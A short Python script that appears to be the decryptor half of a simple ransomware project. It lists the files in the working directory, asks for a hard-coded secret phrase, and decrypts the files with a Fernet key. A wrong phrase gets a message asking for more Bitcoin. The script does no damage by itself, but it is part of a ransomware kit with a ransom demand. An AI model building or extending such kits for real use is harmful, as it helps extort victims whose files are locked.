import os
from cryptography.fernet import Fernet

# Read and print contents of banner.txt
with open("banner.txt", "r") as banner_file:
    banner_content = banner_file.read()
    print(banner_content)

#lets find some files

files = []

for file in os.listdir():
        if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "banner.txt":
                continue
        if os.path.isfile(file):
                files.append(file)
print(files)

with open("thekey.key","rb") as key:
        secretkey = key.read()

secretphrase = "idontknow"

user_phrase = input("Enter the scret phrase to decrypt your files\n")

if user_phrase == secretphrase:
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                contents_dencrypted = Fernet(secretkey).decrypt(contents)
                with open(file,"wb") as thefile:
                        thefile.write(contents_dencrypted)
                print("Congrats, you're files are decrypted. Enjoy Your coffee")
else:
        print("Sorry, wrong secret phrase, send me more Bitcoin")